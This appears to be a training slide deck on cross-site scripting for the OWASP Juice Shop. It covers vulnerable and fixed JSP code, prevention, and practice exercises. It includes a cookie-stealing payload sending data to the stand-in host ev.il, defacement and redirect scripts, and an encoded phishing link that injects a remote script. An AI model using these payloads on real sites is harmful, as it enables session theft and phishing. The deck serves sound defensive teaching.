<!-- theme: default -->
<!-- paginate: true -->
<!-- footer: Copyright (c) by **Bjoern Kimminich** | Licensed under [CC-BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/) -->

# XSS

## (Cross-Site Scripting)

---

# [Cross-Site Scripting](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS))

1. An attacker can use XSS to send a malicious script to an unsuspecting
   user
2. The end user's browser has _no way to know that the script should not
   be trusted_, and will execute the script

---

# Root Cause

Web applications vulnerable to XSS...

1. ...include untrusted data (usually from an HTTP request) into dynamic
   content...
2. ...that is then sent to a web user _without previously validating for
   malicious content_

---

# Typical Impact

* Steal user's session
* Steal sensitive data
* Rewrite the web page
* Redirect user to malicious website

---

# Typical Phishing Email

<small>Dear valued customer!

You won our big lottery which you might not even have participated in!
Click on the following totall inconspicious link to claim your prize
**now**!

[CLICK HER! FREE STUFF! YOU WON!](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp)

Sincereely yours,

Bjorn Kimminich CEO of Juice Shop Inc.

<small><small>_Juice Shop Inc. is registered as a bla bla bla bla yadda
yadda yadda more assuring legal bla All logos and icons are trademarks
of Juice Shop Inc. Copyright (c) 2018 Juice Shop
Inc._</small></small></small>

---

# Risk Rating

## Cross-Site Scripting (XSS)

| Exploitability    | Prevalence              | Detecability      | Impact                          | Risk                                                                                                     |
|:------------------|:------------------------|:------------------|:--------------------------------|:---------------------------------------------------------------------------------------------------------|
| :red_circle: Easy | :red_circle: Widespread | :red_circle: Easy | :large_orange_diamond: Moderate | [A7](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)) |

---

# :x: Vulnerable Code Example

```
<!--search.jsp-->

<%String searchCriteria = request.getParameter("searchValue");%>
```

might forward to the following page when executing the search:

```
<!--results.jsp-->

Search results for <b><%=searchCriteria%></b>:

<table>
<!-- Render the actual results table here -->
</table>
```

---

# Benign Usage

` https://my-little-application.com/search.jsp?searchValue=blablubb `

results in the following HTML on the `results.jsp` page:

```html
Search results for <b>blablubb</b>:
```

rendering as:

<hr>

Search results for <b>blablubb</b>:

---

# Exploit Example

` https://my-little-application.com/search.jsp?searchValue=</b><img
src="https://placekitten.com/g/100/100"/><b> `

results in the following HTML on the `results.jsp` page:

```html
Search results for
  <b></b><img src="https://placekitten.com/g/100/100"/><b></b>:
```

rendering as:

<hr>

Search results for <b></b><img
src="https://placekitten.com/g/100/100"/><b></b>:

---

# XSS Attack Payload Examples

#### Stealing User Session

```
<script>
  new Image().src="http://ev.il/hijack.php?c="+encodeURI(document.cookie);
</script>
```

#### Site Defacement

```
<script>document.body.background="http://ev.il/image.jpg";</script>
```

#### Redirect

```
<script>window.location.assign("http://ev.il");</script>
```

---

# Forms of XSS

* **Reflected XSS**: Application includes unvalidated and unescaped user
  input as part of HTML output
* **Stored XSS**: Application stores unsanitized user input that is
  viewed at a later time by another user
* **DOM XSS**: JavaScript frameworks & single-page applications
  dynamically include attacker-controllable data to a page

_:information_source: The previous example vulnerability and exploit of
`results.jsp` is a typical Reflected XSS._

---

# [Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

* **Do not include user supplied input in your output!** :100:

<!-- -->

* **Output Encode** all user supplied input
  * e.g. OWASP Java Encoder
* Perform **White List Input Validation** on user input

<!-- -->

* Use an HTML Sanitizer for larger user supplied HTML chunks
  * e.g. OWASP Java HTML Sanitizer

---

# :heavy_check_mark: Fixed Code Example

Using `Encoder` from
[OWASP Java Encoder Project](https://owasp.org/www-project-java-encoder/):

```
<%import org.owasp.encoder.Encoder;%>

Search results for <b><%=Encoder.forHtml(searchCriteria)%></b>:
<!-- ... -->
```

Same result using `HtmlUtils` from the popular Spring framework:

```
<%import org.springframework.web.util.HtmlUtils;%>

Search results for <b><%=HtmlUtils.htmlEscape(searchCriteria)%></b>:
<!-- ... -->
```

---

# [OWASP Java HTML Sanitizer](https://wiki.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project)

Fast and easy to configure HTML Sanitizer written in Java which lets you
include HTML authored by third-parties in your web application while
protecting against XSS.

## Using a simple pre-packaged policy

```java
private String sanitizeHtml(String html) {
  PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.BLOCKS)
				              .and(Sanitizers.LINKS);
  return policy.sanitize(html);
}
```

---

# Exercise

1. Perform a _DOM XSS_ and/or _Reflected XSS_ attack (:star:)
2. Use the _Bonus Payload_ to enjoy some nice music (:star:)
3. Beat a weak _Client-side XSS Protection_ during user registration
   (:star::star::star:)
4. Give the shop feedback bypassing its _Server-side XSS Protection_
   (:star::star::star::star:)

